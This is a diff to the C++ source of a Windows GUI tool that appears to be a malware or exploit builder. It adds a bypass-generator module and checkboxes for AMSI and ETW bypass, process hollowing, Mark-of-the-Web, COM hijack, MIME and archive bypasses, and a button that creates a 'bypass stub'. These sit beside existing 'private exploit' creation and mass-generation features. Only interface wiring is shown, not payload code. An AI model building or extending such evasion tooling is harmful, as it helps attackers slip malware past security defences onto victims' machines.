@@ -36,6 +36,7 @@
 #include "tiny_loader.h"
 #include "cross_platform_encryption.h"
 #include "enhanced_loader_utils.h"
+#include "enhanced_bypass_generator.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -83,6 +84,17 @@ constexpr int ID_TARGET_URL_EDIT = 1029;
 constexpr int ID_BYPASS_ALL_CHECK = 1030;
 constexpr int ID_CREATE_ADVANCED_EXPLOIT = 1031;
 
+// Enhanced Bypass Generator Controls
+constexpr int ID_BYPASS_AMSI_CHECK = 1032;
+constexpr int ID_BYPASS_ETW_CHECK = 1033;
+constexpr int ID_BYPASS_DEBUGGER_ASSIST_CHECK = 1034;
+constexpr int ID_BYPASS_PROCESS_HOLLOW_CHECK = 1035;
+constexpr int ID_BYPASS_MOTW_CHECK = 1036;
+constexpr int ID_BYPASS_COM_HIJACK_CHECK = 1037;
+constexpr int ID_BYPASS_MIME_CHECK = 1038;
+constexpr int ID_BYPASS_ARCHIVE_CHECK = 1039;
+constexpr int ID_CREATE_BYPASS_STUB = 1040;
+
 // Global variables for mass generation
 bool g_massGenerationActive = false;
 HANDLE g_massGenerationThread = NULL;
@@ -101,6 +113,17 @@ HWND g_hBypassAllCheck;
 HWND g_hCustomIconEdit;
 HWND g_hCustomIconBrowse;
 HWND g_hTargetUrlEdit;
+
+// Enhanced Bypass Generator HWNDs
+HWND g_hBypassAmsiCheck;
+HWND g_hBypassEtwCheck;
+HWND g_hBypassDebuggerAssistCheck;
+HWND g_hBypassProcessHollowCheck;
+HWND g_hBypassMotwCheck;
+HWND g_hBypassComHijackCheck;
+HWND g_hBypassMimeCheck;
+HWND g_hBypassArchiveCheck;
+HWND g_hCreateBypassStubButton;
 
 // Exploit Delivery Types
 enum ExploitDeliveryType {
@@ -1863,6 +1886,7 @@ public:
     AdvancedExploitEngine exploitEngine;
     EmbeddedCompiler embeddedCompiler;
     PrivateExploitGenerator privateExploitGen;
+    EnhancedBypassGenerator bypassGenerator;
     
     struct CompanyProfile {
         std::string name;
@@ -3553,17 +3577,47 @@ static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM l
             g_hBypassGDriveCheck = CreateWindowW(L"BUTTON", L"Bypass Google Drive", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
                                                 270, 540, 140, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_GDRIVE_CHECK, NULL, NULL);
             
-            // Custom icon input (third row)
+            // Enhanced Bypass Controls (third row)
+            g_hBypassAmsiCheck = CreateWindowW(L"BUTTON", L"AMSI Bypass", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                              10, 565, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_AMSI_CHECK, NULL, NULL);
+            
+            g_hBypassEtwCheck = CreateWindowW(L"BUTTON", L"ETW Bypass", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                             120, 565, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_ETW_CHECK, NULL, NULL);
+            
+            g_hBypassDebuggerAssistCheck = CreateWindowW(L"BUTTON", L"Debugger Assist", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                        230, 565, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_DEBUGGER_ASSIST_CHECK, NULL, NULL);
+            
+            g_hBypassProcessHollowCheck = CreateWindowW(L"BUTTON", L"Process Hollow", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                       360, 565, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_PROCESS_HOLLOW_CHECK, NULL, NULL);
+            
+            // Enhanced Bypass Controls (fourth row)
+            g_hBypassMotwCheck = CreateWindowW(L"BUTTON", L"MOTW Bypass", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                              10, 590, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_MOTW_CHECK, NULL, NULL);
+            
+            g_hBypassComHijackCheck = CreateWindowW(L"BUTTON", L"COM Hijack", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                   120, 590, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_COM_HIJACK_CHECK, NULL, NULL);
+            
+            g_hBypassMimeCheck = CreateWindowW(L"BUTTON", L"MIME Bypass", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                              230, 590, 100, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_MIME_CHECK, NULL, NULL);
+            
+            g_hBypassArchiveCheck = CreateWindowW(L"BUTTON", L"Archive Bypass", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
+                                                 340, 590, 120, 20, hwnd, (HMENU)(UINT_PTR)ID_BYPASS_ARCHIVE_CHECK, NULL, NULL);
+            
+            // Bypass Stub Generation Button
+            g_hCreateBypassStubButton = CreateWindowW(L"BUTTON", L"Create Enhanced Bypass Stub", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
+                                                     10, 620, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_BYPASS_STUB, NULL, NULL);
+            
+            // Custom icon input (sixth row)
             CreateWindowW(L"STATIC", L"Custom Icon:", WS_VISIBLE | WS_CHILD,
-                         10, 570, 80, 20, hwnd, NULL, NULL, NULL);
+                         10, 660, 80, 20, hwnd, NULL, NULL, NULL);
             g_hCustomIconEdit = CreateWindowW(L"EDIT", L"", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_AUTOHSCROLL,
-                                             95, 567, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
+                                             95, 657, 280, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_EDIT, NULL, NULL);
             g_hCustomIconBrowse = CreateWindowW(L"BUTTON", L"Browse", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                                               385, 567, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
+                                               385, 657, 60, 25, hwnd, (HMENU)(UINT_PTR)ID_CUSTOM_ICON_BROWSE, NULL, NULL);
             
             // Advanced exploit creation button
             CreateWindowW(L"BUTTON", L"Create Advanced Private Exploit", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
-                         10, 600, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
+                         220, 620, 200, 30, hwnd, (HMENU)(UINT_PTR)ID_CREATE_ADVANCED_EXPLOIT, NULL, NULL);
             
             // Enable drag and drop
             DragAcceptFiles(hwnd, TRUE);
